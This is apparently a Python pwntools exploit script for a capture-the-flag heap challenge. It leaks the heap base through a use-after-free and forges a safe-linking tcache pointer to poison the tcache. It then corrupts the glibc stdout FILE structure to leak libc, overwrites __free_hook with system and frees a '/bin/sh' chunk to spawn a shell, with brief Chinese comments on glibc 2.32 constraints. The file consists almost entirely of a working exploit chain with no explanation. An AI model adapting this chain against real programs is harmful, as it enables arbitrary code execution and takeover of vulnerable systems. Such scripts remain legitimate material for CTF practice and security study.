#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('>>')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.send(con)

def dele():
    eat()
    p.sendline('2')

def show():
    eat()
    p.sendline('3')

def edit(con):
    eat()
    p.sendline('5')
    p.recvuntil('Content:')
    p.send(con)

add(0x50, '1')
dele()
show()
heapbase = u64(p.recv(5).ljust(8, b"\x00")) << 12
log.success("heapbase: "+hex(heapbase))

edit(p64(0) + p64(0))
dele()

fd_addr = heapbase+0x2a0
tcache_addr = heapbase+0x10
xor = (fd_addr>>12) ^ tcache_addr
edit(p64(xor))

add(0x50, '1')
payload = p8(0)*0x4e + p8(7)
add(0x50, payload)

dele()


add(0x48,(b'\x00\x00'*3+b'\x01\x00'+b'\x00\x00'*2+b'\x01\x00').ljust(0x48,b'\x00'))#* size 有限制 分两次 0x50[1] 0x80[1]

add(0x38,(b'\x00'*0x38)) #! tcache 0x40 0x50 踩出 unsorted

_IO_2_1_stdout_ = 0x16c0
add(0x10, b'a'*8+p16(_IO_2_1_stdout_))

add(0x40, p64(0x0FBAD1800) + p64(0)*3 + p8(0x28))
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['_IO_2_1_stdin_']
log.success("libc.address: " + hex(libc.address))

free_hook = libc.symbols["__free_hook"]
log.success("free_hook: "+hex(free_hook))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
debug()
add(0x10, p64(free_hook-0x10))#* libc2.32 地址必须对齐

add(0x70, b'/bin/sh\x00'*2+p64(system_addr))

dele()

p.interactive()
